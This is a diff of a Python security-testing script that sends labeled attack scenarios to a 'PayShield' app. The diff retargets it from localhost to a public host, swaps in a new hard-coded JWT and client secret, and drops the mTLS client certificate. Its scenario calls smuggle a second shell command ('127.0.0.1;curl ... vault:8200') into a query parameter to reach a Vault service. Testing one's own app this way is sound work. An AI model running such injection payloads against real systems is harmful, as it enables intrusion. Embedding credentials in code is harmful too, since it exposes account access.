@@ -8,14 +8,11 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # --- CONFIGURATION ---
-BASE_URL = "https://localhost:8888"
-# Thay token vào đây
-TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICIwSGtPQy1TVE1pSE44aGlTZkhBU1p5Z1pUbHpLQXVyMmU0S3VSb291VW5BIn0.eyJleHAiOjE3Nzg1NjQ3NjcsImlhdCI6MTc3ODU2NDQ2NywiYXV0aF90aW1lIjoxNzc4NTY0MTYyLCJqdGkiOiJjZGM3NmYzMy02MzI1LTQxNzEtYWFhOS1mMmU3ZTRhYzhiMzYiLCJpc3MiOiJodHRwczovL2xvY2FsaG9zdDo4NDQ0L3JlYWxtcy9wYXlzaGllbGQtcmVhbG0iLCJzdWIiOiJiZWJiNjk1NC0wZTBmLTQ3ZmMtODkzZS0yNmFmZGY1NjYyNmEiLCJ0eXAiOiJCZWFyZXIiLCJhenAiOiJwYXlzaGllbGQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6IjljZTg4NDAyLWFiOWEtNDBlNy04NmNjLWNkODgwNzAwNmYxNCIsImFjciI6IjEiLCJhbGxvd2VkLW9yaWdpbnMiOlsiaHR0cHM6Ly9vYXV0aC5wc3Rtbi5pbyIsImh0dHBzOi8vbG9jYWxob3N0Ojg4ODgiXSwicmVhbG1fYWNjZXNzIjp7InJvbGVzIjpbImVtcGxveWVlIl19LCJjbmYiOnsieDV0I1MyNTYiOiJ5NEJRWmNRTEJIeVcyQ09wbnA0ejhwWmJTaHM3cy1aemszRG1UczcxVzBBIn0sInNjb3BlIjoib3BlbmlkIHByb2ZpbGUgZW1haWwiLCJzaWQiOiI5Y2U4ODQwMi1hYjlhLTQwZTctODZjYy1jZDg4MDcwMDZmMTQiLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwibmFtZSI6Ikh1bmcgTmd1eWVuIiwicHJlZmVycmVkX3VzZXJuYW1lIjoiZW1wbG95ZWUtZXhhbXBsZUBwYXlzaGllbGQuY29tIiwiZ2l2ZW5fbmFtZSI6Ikh1bmciLCJmYW1pbHlfbmFtZSI6Ik5ndXllbiIsImVtYWlsIjoiZW1wbG95ZWUtZXhhbXBsZUBwYXlzaGllbGQuY29tIn0.I71e1n-PsFdEFWcl3kj4ZwpCbtuVbj7TarVNh4NHyjYZ-QUY-wA8HZ_aVIBPY4AnO0o3TydO1Am1rxyHE5bHfw"
-# Thay client secret vào đây
-SECRET = "HoHjwBR7aSEJtzQ1DylcppVxZ4CWnVmQ" 
+BASE_URL = "https://payshield.duckdns.org:8888"
 
-CA = 'kms/ca.crt'
-CLIENT = ('kms/client.crt', 'kms/client.key')
+TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJqbm1MNU1CQ3ZXelR2V2xaVFo0S0hXU0gwV2V5ZmhzaUduLVUwSkNmdWN3In0.eyJleHAiOjE3ODEwOTE3NTMsImlhdCI6MTc4MTA5MTQ1MywiYXV0aF90aW1lIjoxNzgxMDkxNDA0LCJqdGkiOiI0OGRlOTgzYi0zMDI5LTRhNWEtYTZkYy0wZTVhMDhjNzVkYTciLCJpc3MiOiJodHRwczovL3BheXNoaWVsZC5kdWNrZG5zLm9yZzo4NDQ0L3JlYWxtcy9wYXlzaGllbGQtcmVhbG0iLCJhdWQiOiJhY2NvdW50Iiwic3ViIjoiMzY4NmEwYTEtNGQ5NS00ZTEwLWI5ZGUtNzQ2ZTYxYmUwNGZhIiwidHlwIjoiQmVhcmVyIiwiYXpwIjoicGF5c2hpZWxkLWFwcCIsInNlc3Npb25fc3RhdGUiOiIzMDUzMDVhZi02NmY4LTQxZjQtOTBkOS0zNDUwZDI1MGY1NTgiLCJhY3IiOiIwIiwiYWxsb3dlZC1vcmlnaW5zIjpbIioiXSwicmVhbG1fYWNjZXNzIjp7InJvbGVzIjpbIm9mZmxpbmVfYWNjZXNzIiwiZGVmYXVsdC1yb2xlcy1wYXlzaGllbGQtcmVhbG0iLCJ1bWFfYXV0aG9yaXphdGlvbiIsImVtcGxveWVlIl19LCJyZXNvdXJjZV9hY2Nlc3MiOnsiYWNjb3VudCI6eyJyb2xlcyI6WyJtYW5hZ2UtYWNjb3VudCIsIm1hbmFnZS1hY2NvdW50LWxpbmtzIiwidmlldy1wcm9maWxlIl19fSwic2NvcGUiOiJvcGVuaWQgcHJvZmlsZSBlbWFpbCIsInNpZCI6IjMwNTMwNWFmLTY2ZjgtNDFmNC05MGQ5LTM0NTBkMjUwZjU1OCIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJlbXBsb3llZS1leGFtcGxlQHBheXNoaWVsZC5jb20iLCJlbWFpbCI6ImVtcGxveWVlLWV4YW1wbGVAcGF5c2hpZWxkLmNvbSJ9.PFJDtZJtfjBVjjhYtHdy0ZciXLaqafVjz9mBh_-m9vSYpDwUOu8pAYuApRDzNC1F61IqZjaHE8BMcBTm_-5Zyw"
+
+SECRET = "gTPf9LYwK20ngQcRSd9mTiCxmXLKze7n"
 
 def payload(method, uri, ts, nonce, token, secret):
     payload_str = f"{method}|{uri}|{ts}|{nonce}|{token}"
@@ -39,10 +36,8 @@ def send(label, method, uri, use_mtls=True, json_data=None):
     url = f"{BASE_URL}{uri}"
     print(f"Target: {method} {uri}")
     
-    cert = CLIENT if use_mtls else None
-    
     try:
-        response = requests.request(method, url, headers=headers, json=json_data, cert=cert, verify=False, timeout=7)
+        response = requests.request(method, url, headers=headers, json=json_data, verify=False, timeout=7)
         print(f"Status: {response.status_code}")
         preview = response.text[:150] + ("..." if len(response.text) > 150 else "")
         print(f"Response: {preview}")
@@ -68,13 +63,13 @@ send(
 send(
     label="SCENARIO 2: SSRF TO HASHICORP VAULT", 
     method="GET", 
-    uri="/api/employees?ip=127.0.0.1;curl -s -k https://payshield_vault:8200/v1/sys/health"
+    uri="/api/employees?ip=127.0.0.1;curl -s -k https://payshield.duckdns.org:8200/v1/sys/health"
 )
 
 # SCENARIO 3: SSRF WITHOUT mTLS 
 send(
-    label="SCENARIO 6: SSRF ATTEMPT WITHOUT mTLS", 
+    label="SCENARIO 3: SSRF ATTEMPT WITHOUT mTLS", 
     method="GET", 
-    uri="/api/employees?ip=127.0.0.1;curl -s -k https://payshield_vault:8200/v1/sys/health",
+    uri="/api/employees?ip=127.0.0.1;curl -s -k https://payshield.duckdns.org:8200/v1/sys/health",
     use_mtls=False
 )   
